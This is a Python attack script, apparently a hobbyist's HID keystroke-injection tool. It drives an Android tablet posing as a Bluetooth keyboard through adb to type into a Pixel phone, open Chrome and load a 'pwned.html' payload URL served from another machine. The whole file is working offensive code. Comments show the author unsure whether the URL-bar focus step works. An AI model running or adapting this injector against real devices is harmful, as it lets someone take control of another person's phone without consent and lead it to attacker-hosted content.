import os
import time
import subprocess

# DUDE'S ANDROID-ON-ANDROID INJECTOR
# Target: Pixel 9 Pro XL (Android)
# Host: SM-T590 (Tablet acting as Keyboard)

TARGET_IP = "192.168.0.34"
PORT = 8000
PAYLOAD_URL = f"http://{TARGET_IP}:{PORT}/pwned.html"

def run_adb(cmd):
    # This sends input to the TABLET, which sends HID to the PIXEL
    subprocess.run(f"adb shell {cmd}", shell=True)

def inject():
    print(f"[*] DUDE: Targeting Android Device (Pixel 9 Pro XL)...")
    print(f"[*] Ensure 'Bluetooth Keyboard & Mouse' app is OPEN and FOCUSED on the tablet.")
    
    # 1. Open App Drawer / Search on Pixel
    print("[*] Sending 'Meta/Windows' Key to open Search...")
    run_adb("input keyevent 117") # META_LEFT (Windows Key)
    time.sleep(1)

    # 2. Type 'Chrome' to find the browser
    print(f"[*] Searching for Chrome...")
    run_adb(f"input text 'Chrome'")
    time.sleep(0.5)

    # 3. Open Chrome
    print("[*] Launching Chrome...")
    run_adb("input keyevent 66") # ENTER
    time.sleep(2) # Wait for app launch

    # 4. Focus URL Bar (Ctrl + L)
    # Note: Android supports standard shortcuts
    print("[*] Focusing URL Bar (Ctrl+L)...")
    # We need to hold CTRL (113) and press L (40)
    # Simulating via ADB text might not work for combos, 
    # so we assume standard typing focus or use Tab if needed.
    # Let's try sending TABs just in case, or re-triggering search.
    # Actually, on Android Chrome, hitting Menu or Search usually highlights URL.
    # Let's try the direct approach: F6 or Ctrl+L
    # Complex combos are hard via ADB-to-App, so we'll just type the URL blindly if focus is there,
    # or use TABs.
    # Reliable method: Ctrl+L usually works if the app supports it.
    
    # Simulating combo on the tablet app is tricky without raw event access.
    # We will try to just Type the URL. Often opening Chrome focuses the bar or search.
    
    print("[*] Typing Payload URL...")
    run_adb(f"input text '{PAYLOAD_URL}'")
    time.sleep(1)

    # 5. Go
    print("[*] Sending ENTER...")
    run_adb("input keyevent 66")
    
    print("\n[+] DUDE: Payload URL injected. Check the Pixel screen!")

if __name__ == "__main__":
    inject()
